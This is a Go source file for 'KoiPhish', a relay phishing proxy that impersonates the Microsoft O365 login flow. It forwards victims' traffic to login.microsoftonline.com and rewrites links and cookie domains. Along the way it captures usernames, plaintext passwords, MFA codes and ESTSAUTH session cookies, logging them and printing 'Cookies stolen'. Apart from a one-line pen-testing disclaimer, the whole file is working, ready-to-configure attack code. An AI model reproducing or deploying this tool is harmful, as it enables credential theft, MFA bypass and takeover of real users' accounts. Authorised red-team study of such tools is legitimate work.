// KoiPhish - A simple yet beautiful relay proxy put together quickly.
// This KoiPhish targets a common login flow and can be customized.
// December 2018,  MIT License

// Disclaimer: Make sure you have proper authorization before pen testing.
//             Don't do anything illegal.

package main

import (
	"bytes"
	"compress/gzip"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/http/httputil"
	"net/url"
	"os"
	"strings"
	"time"
)

const _sourceHost = "<UPDATE>"                                                                         //ip address of your server
const _resourceURL = "https://<TARGET>.sharepoint.com/_forms/default.aspx?ReturnUrl=%2f&Source=cookie" // a resource to access
const _finalRedirect = "https://<TARGET>.sharepoint.com/"                                              // final redirect page after login
const _tenantuuid = "<TARGET UUID>"                                                                    //O365 tenant ID
const _target = "https://login.microsoftonline.com"                                                    //target server/URL to relay to and from

var _cookiesToLookFor = []string{"ESTSAUTHLIGHT", "ESTSAUTHPERSISTENT"} //cookies to look for in response from target and which domain the should be set on
//var _requestsToDump = []string{"/login", "/GetCredential", "/kmsi", "ProcessAuth"} //requests/response with that URL will be written to log file
var _requestsToIgnore = []string{"/instrumentation"} //these requests will not be processed by the proxy
var _addtionalCustomBodyRewrites = []string{}        //custom _targetHost.Host replacements in reply body
//"aadcdn.msauthimages.net", "passwordreset.microsoftonline.com", "autologon.microsoftazuread-sso.com", "login.microsoft.com", "login.live.com", "signup.microsoft.com", "login.microsoftonline.com", "aadcdn.msauth.net", "aadcdn.msftauth.net"}

var _targetURL *url.URL  // url.Parse() of target.
var _targetDomain string // (e.g. https://target).
var _logfile *os.File
var _resourceHost string // the host name of the resource to access

func initialize() {
	// Setup log file and set target variables

	//create the log file
	starttime := time.Now()
	os.Mkdir("logs", 0774)
	filename := "./logs/koiphish." + starttime.Format("2006-01-02_150405") + ".log"

	_logfile, err := os.OpenFile(filename, os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Println(err)
		panic(err)
	}
	log.SetOutput(_logfile)

	//parse and set URL variables
	_targetURL, err = url.Parse(_target)
	if err != nil {
		panic(err)
	}

	_targetDomain = _targetURL.Scheme + "://" + _targetURL.Host

	parsedURl, err := url.Parse(_resourceURL)
	if err != nil {
		panic(err)
	}
	_resourceHost = parsedURl.Hostname()

	log.Println("KoiPhish started.")
	log.Println("Source: " + _sourceHost)
	log.Println("Target: " + _targetDomain)
	log.Println("Resource: " + _resourceURL)
	log.Println("Resource Host: " + _resourceHost)
	log.Println("Logfile: " + filename)
}

func main() {

	initialize()

	fmt.Println("")
	fmt.Println("")
	fmt.Println("  _  __     _ ____  _     _     _              /`·.¸")
	fmt.Println(" | |/ /___ (_)  _ \\| |__ (_)___| |__          /¸...¸`:·")
	fmt.Println(" | ' // _ \\| | |_) | '_ \\| / __| '_ \\    ¸.·´  ¸    `·.¸.·´)")
	fmt.Println(" | . \\ (_) | |  __/| | | | \\__ \\ | | |  : © ) ´;      ¸  {")
	fmt.Println(" |_|\\_\\___/|_|_|   |_| |_|_|___/_| |_|   ·.      ¸.·´\\  `·¸)")
	fmt.Println("                                           ``\\\\´´\\¸¸.·´")
	fmt.Println("")
	fmt.Println("             .................................................. KoiPhish started.")
	fmt.Println("")
	fmt.Println("Phishing at https://" + _sourceHost + "/portal")
	fmt.Println("")

	//ASCII fish from here: https://www.asciiart.eu/animals/fish
	//https://onlineasciitools.com/convert-text-to-ascii-art

	//Initial Request redirect to proper O365 tenant
	http.HandleFunc("/portal", func(w http.ResponseWriter, r *http.Request) {
		log.Println("From: " + r.RemoteAddr + " Request: " + r.RequestURI + " Using: " + r.UserAgent())
		//dumpRequest(r)

		//First we issue a request to the resource we want to finally access
		//during testing it seemed that this is necessary to have a smooth auth flow
		//this is all very specific to login.microsoftonline.com and login.windows.net
		//TODO: see if this can be simplified.
		request, _ := http.NewRequest("GET", _resourceURL, nil)

		request.Header.Set("User-Agent", r.Header.Get("User-Agent"))
		request.Header.Set("Host", _resourceHost)
		request.Host = _resourceHost

		// for k, v := range request.Header {
		// 	fmt.Printf("%s: %s\n",k,v)
		// }

		// Issue the relay request to the target web server
		// dump, err :=httputil.DumpRequestOut(request,false)
		// if err != nil {
		// 	log.Fatal(err)
		// }
		// fmt.Printf("REQUEST HEADERS: %q", dump)

		//ignore redirect for this one
		client := &http.Client{
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		}

		resp, err := client.Do(request)
		if err != nil {
			log.Printf("From: %s Request: %s Message: Error issueing request: %v\n", r.RemoteAddr, r.RequestURI, err)
			http.Error(w, "", http.StatusBadRequest)
			return
		}
		defer resp.Body.Close()

		redirect := resp.Header.Get("Location")
		redirect = strings.Replace(redirect, "login.windows.net", _sourceHost, -1)
		http.Redirect(w, r, redirect, 302)
	})

	//Main Generic Proxy Request Handler
	http.HandleFunc("/common/GetCredentialType", processGetCredentialAndLogin)
	http.HandleFunc("/common/login", processGetCredentialAndLogin)
	http.HandleFunc("/"+_tenantuuid+"/oauth2/authorize", processGetCredentialAndLogin)
	http.HandleFunc("/"+_tenantuuid+"/login", processGetCredentialAndLogin)
	http.HandleFunc("/"+_tenantuuid+"/reprocess", processGetCredentialAndLogin)
	http.HandleFunc("/favicon.ico", processGetCredentialAndLogin)
	http.HandleFunc("/kmsi", processGetCredentialAndLogin)
	http.HandleFunc("/common/SAS/BeginAuth", processGetCredentialAndLogin)
	http.HandleFunc("/common/SAS/EndAuth", processGetCredentialAndLogin)
	http.HandleFunc("/common/SAS/ProcessAuth", processGetCredentialAndLogin)

	//missing requests seen during ops.
	//GetOneTimeOTP
	//GetDeviceTls
	//http.HandleFunc("/common/instrumentation/dssostatus", processGetCredentialAndLogin )

	// we don't handle requests to the root (this will prevent scanners and stuff to get involved)
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		log.Printf("From: %s Request: %s Message: *** ROOT REQUEST ***\n", r.RemoteAddr, r.RequestURI)
	})

	//Ignore a couple of common telemetry requests...
	for i := 0; i < len(_requestsToIgnore); i++ {
		http.HandleFunc(_requestsToIgnore[i], blackholeRequest)
	}

	//Start the TLS server
	err := http.ListenAndServeTLS(":443", "server.crt", "server.key", nil)

	if err != nil {
		log.Printf("Error starting web server: %v\n", err)
		panic(err)
	}
	fmt.Println("Waiting for requests.")
}

func processGetCredentialAndLogin(w http.ResponseWriter, r *http.Request) {

	log.Println("From: " + r.RemoteAddr + " Request: " + r.RequestURI)
	dumpRequest(r)

	untrustedusername := ""
	untrustedcred := ""
	otp := ""

	//rewrite potential query params to real target
	updatedRequestURL := strings.Replace(r.RequestURI, _sourceHost, _targetURL.Host, -1)
	destinationURL := _targetDomain + updatedRequestURL

	var request *http.Request

	//If the request is a POST we look for credentials in the body and rewrite links
	if r.Method == "POST" {

		postBody, err := ioutil.ReadAll(r.Body)
		if err != nil {
			log.Printf("From: %s Request: %s Message: Error reading post body: %v\n", r.RemoteAddr, r.RequestURI, err)
			http.Error(w, "", http.StatusBadRequest)
			return
		}

		//check if there is anything of interest in the body
		untrustedusername, untrustedcred, otp = analyzeBody(r, string(postBody))

		//fix any invalid domain names in the body (assuming the post is a text for now)
		postBodyString := strings.Replace(string(postBody), _sourceHost, _targetURL.Host, -1)

		requestBody := bytes.NewReader([]byte(postBodyString))
		request, err = http.NewRequest(r.Method, destinationURL, requestBody)

	} else {
		//create a basic request (this handles any GET requests)
		request, _ = http.NewRequest(r.Method, destinationURL, r.Body)
	}

	//assign headers and rewrite some to make request more legit
	request.Header = r.Header
	rewriteHeaders(request, r)

	//dumpRequest(request)
	//Issue the relay request to the target web server
	resp, err := http.DefaultClient.Do(request)
	if err != nil {
		log.Printf("From: %s Request: %s Message: Error sending request %v\n", r.RemoteAddr, r.RequestURI, err)
		http.Error(w, "", http.StatusBadRequest)
		return
	}
	defer resp.Body.Close()

	//log.Println("Cookies might be in this response")
	//dumpResponse(resp)

	//read the response body
	content, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Printf("From: %s Request: %s Message: Error reading uncompressed body: %v\n", r.RemoteAddr, r.RequestURI, err)
		http.Error(w, "", http.StatusBadRequest)
		return
	}

	//Do we have to decompress before editing links?
	if resp.Header.Get("Content-Encoding") == "gzip" {
		content = decompress(content)
	}

	//TODO: Add the /common/SAS/EndAuth check??
	cookies := checkForCookies(resp, string(content))
	if cookies != "" {
		log.Printf("From: %s Request: %s Message: *** Cookie for (%s,%s,%s) use: %s",
			r.RemoteAddr, r.RequestURI, untrustedusername,
			untrustedcred, otp, cookies)

		//only print limited info on screen
		if strings.Index(r.RequestURI, "/common/SAS/ProcessAuth") >= 0 {
			if cookies != "" {
				//log.Printf("%s: *** Cookie for (%s,%s, %s), use: %s\n", untrustedusername, untrustedcred, otp, cookies)
				fmt.Printf("%s *** Cookies stolen  :)\n", r.RemoteAddr) // for (%s,%s), use: %s", untrustedusername, untrustedcred, cookies)
			}
		}
	}

	//update links
	content = []byte(updateBody(string(content), _targetDomain))

	//Compress it again?
	if resp.Header.Get("Content-Encoding") == "gzip" {
		content = compress(content)
	}

	//attach headers to response
	for key, value := range resp.Header {

		if key == "Content-Length" {
			w.Header().Add(key, string(len(content)))
			continue
		}

		for _, valueToSet := range value {

			topLevel := "." + _targetURL.Hostname()

			//we want to set all the cookies on the proxy site
			//this means we have to update the domain names on cookies
			//TODO: this needs to be updated depedning on auth provider typically
			if key == "Set-Cookie" {
				//valueToSet = strings.Replace(valueToSet, "CkTst=GT1593939","",-1);
				valueToSet = strings.Replace(valueToSet, "domain="+topLevel+";", "", -1)
				valueToSet = strings.Replace(valueToSet, "Domain="+topLevel+";", "", -1)
				//log.Println("* Updated Cookie After: " + valueToSet)
			}

			w.Header().Add(key, valueToSet)
		}
	}

	//do manual redirect in end
	if strings.Index(r.RequestURI, "/kmsi") >= 0 {
		http.Redirect(w, r, _finalRedirect, 302)
	} else {
		w.Write(content)
	}
}

func blackholeRequest(w http.ResponseWriter, r *http.Request) {
	http.Error(w, "Not applicable.", http.StatusBadRequest)
	return
}

func rewriteHeaders(request *http.Request, sourceRequest *http.Request) {

	//Note: only patches the very first header[0], which seems good enough
	//Consider replacing all occurences here.
	for key, value := range sourceRequest.Header {
		neworig := strings.Replace(value[0], _sourceHost, _targetURL.Host, -1)
		request.Header.Set(key, neworig)
	}

	//update headers, so everything looks legit
	request.Header.Set("Host", _targetURL.Host)

	//set this explicilty - golang seems to overwrite.
	request.Header.Set("User-Agent", sourceRequest.UserAgent())
}

func dumpRequest(r *http.Request) {

	//for i := 0; i < len(_requestsToDump); i++ {
	//	if strings.Index(r.RequestURI, _requestsToDump[i]) >= 0 {
	dump, err := httputil.DumpRequest(r, true)
	if err != nil {
		log.Println(err)
	}

	log.Printf("From: %s Request: %s Message: %q\n", r.RemoteAddr, r.RequestURI, string(dump))
	//	}
	//}
}

func dumpResponse(r *http.Response) {

	// for i := 0; i < len(_requestsToDump); i++ {
	// 	if strings.Index(r.Request.RequestURI, _requestsToDump[i]) >= 0 {

	dump, err := httputil.DumpResponse(r, true)
	if err != nil {
		log.Println(err)
	}

	log.Printf("From: (local to %s) Request: %s Message: Dump Target Response: %q\n", r.Request.RemoteAddr, r.Request.RequestURI, string(dump))
	// 	}
	// }
}

// Helper function to decompress the HTTP body payload
func decompress(data []byte) []byte {
	content := []byte("")

	zip, err := gzip.NewReader(bytes.NewReader(data))
	if err != nil {
		log.Printf("Error decompressing: %v\n", err)
	}
	defer zip.Close()

	content, err = ioutil.ReadAll(zip)
	if err != nil {
		log.Printf("Error reading decompressed data: %v\n", err)
	}

	return content
}

// Helper function to compress the HTTP body payload
func compress(content []byte) []byte {
	var tempbuffer bytes.Buffer
	zipit := gzip.NewWriter(&tempbuffer)
	zipit.Write(content)
	zipit.Flush()
	defer zipit.Close()

	content = tempbuffer.Bytes()
	return content
}

// rewrite URLs in the requests to ensure links are working
func updateBody(body string, targetDomain string) string {

	//these rewrites are to make sure the subsquent rewrite doesn't incorrectly update absolute URLs
	body = strings.Replace(body, " src=\"//", " src=\"https://", -1)
	body = strings.Replace(body, " src='//", " src='https://", -1)
	body = strings.Replace(body, " href=\"//", " href=\"https://", -1)
	body = strings.Replace(body, " href='//", " href='https://", -1)

	//regular rewrites start here
	body = strings.Replace(body, " \"url\": \"/\"", " \"url\": \""+_targetDomain+"/", -1)
	body = strings.Replace(body, " href=\"/", " href=\""+_targetDomain+"/", -1)
	body = strings.Replace(body, " href='/", " href='"+_targetDomain+"/", -1)

	body = strings.Replace(body, " content=\"/", " content=\""+_targetDomain+"/", -1)
	body = strings.Replace(body, " content='/", " content='"+_targetDomain+"/", -1)

	body = strings.Replace(body, " src=\"/", " src=\""+_targetDomain+"/", -1)
	body = strings.Replace(body, " src='/", " src='"+_targetDomain+"/", -1)

	//Below rewrites are for cross domain requests
	//we have to make them appear as if they would be on the same site
	body = strings.Replace(body, _targetURL.Host, _sourceHost, -1)

	//Additional configurable custom XHR/AJAX rewrites
	for i := 0; i < len(_addtionalCustomBodyRewrites); i++ {
		body = strings.Replace(body, _addtionalCustomBodyRewrites[i], _sourceHost, -1)
	}

	return body
}

// Helper method for analyzeing and parsing http response for things
func analyzeBody(r *http.Request, postBody string) (string, string, string) {

	username := ""
	cred := ""
	credredacted := ""
	otp := ""

	//check if username was posted
	if strings.Index(r.RequestURI, "/GetCredential") >= 0 {
		username = checkForUsername(string(postBody))
		if username != "" {
			log.Printf("From: %s Request: %s Message: *** Username: %s \n", r.RemoteAddr, r.RequestURI, username)
			fmt.Printf("%s *** Username: %s \n", r.RemoteAddr, username)
		}
	}

	//check if credentials were posted
	if strings.Index(r.RequestURI, "/login") >= 0 {
		cred, credredacted = checkForCredential(string(postBody))
		if cred != "" {
			log.Printf("From: %s Request: %s Message: *** Credentials: %s \n", r.RemoteAddr, r.RequestURI, cred)
			if len(cred) > 4 {
				fmt.Printf("%s *** Credentials: %s \n", r.RemoteAddr, credredacted)
			}
		}
	}

	//checkForOTP
	//AdditionalAuthData\":\"051433\"
	if strings.Index(r.RequestURI, "/common/SAS/EndAuth") >= 0 {
		fmt.Printf("%s *** MFA Code Request ", r.RemoteAddr)

		mfacode := checkForMFA(string(postBody))
		if mfacode != "" {
			log.Printf("From: %s Request: %s Message: *** MFA Code: %s \n", r.RemoteAddr, r.RequestURI, mfacode)
			fmt.Println(": " + mfacode)
		}
	}

	return username, cred, otp

}

// Specific for the basic target. Hacky, but quick way to read username
func checkForUsername(body string) string {

	//hacky, but quick way to read credential
	beginidx := strings.Index(body, "username")
	body, _ = url.QueryUnescape(body[beginidx:])

	user := strings.Split(body, ",")
	if len(user) > 0 {
		return strings.TrimSuffix(strings.TrimPrefix(user[0], "username\":\""), "\"")
	}

	return ""
}

func checkForMFA(body string) string {
	//hacky, but quick way to read credential
	beginidx := strings.Index(body, "AdditionalAuthData")
	if beginidx == -1 {
		return "User probably selected push notification."
	}

	body, _ = url.QueryUnescape(body[beginidx:])

	code := strings.Split(body, ",")
	if len(code) > 0 {
		return strings.TrimSuffix(strings.TrimPrefix(code[0], "AdditionalAuthData\":\""), "\"")
	}

	return ""
}

// Specific for the basic target. Hacky, but quick way to read username
func checkForCredential(body string) (string, string) {

	result := ""
	resultredacted := ""
	templogin := ""

	//hacky, but quick way to read credential
	beginidx := strings.Index(body, "login=")
	login := strings.Split(body[beginidx:], "&")
	if len(login) > 0 {
		templogin, _ = url.QueryUnescape(login[0])
		templogin = strings.TrimLeft(templogin, "login=")
	}

	//hacky, but quick way to read credential
	beginidx = strings.Index(body, "passwd=")
	password := strings.Split(body[beginidx:], "&")
	if len(password) > 0 {
		temppass, _ := url.QueryUnescape(password[0])
		password := strings.TrimLeft(temppass, "passwd=")

		result = templogin + ":" + password

		//added feature to redact the password for UI experience
		//if smaller then 4 its an invalid password anyway so dispalying in full seems okay
		if len(password) > 4 {
			resultredacted = templogin + ":" + password[:4] + "****************"
		} else {
			resultredacted = templogin + ":" + password
		}

		return result, resultredacted
	}

	return "", ""
}

// Look through the HTTP header to find cookies
func checkForCookies(response *http.Response, content string) string {

	cookies := ""

	for i := 0; i < len(response.Cookies()); i++ {

		currentCookie := response.Cookies()[i]
		for _, name := range _cookiesToLookFor {

			if currentCookie.Name == name {
				setcookie := "document.cookie=\"" + currentCookie.Name + "=" + currentCookie.Value + ";domain=." + _targetURL.Hostname() + "\""
				cookies += setcookie + " --- "
				//log.Println(setcookie)
			}
		}
	}

	return cookies
}
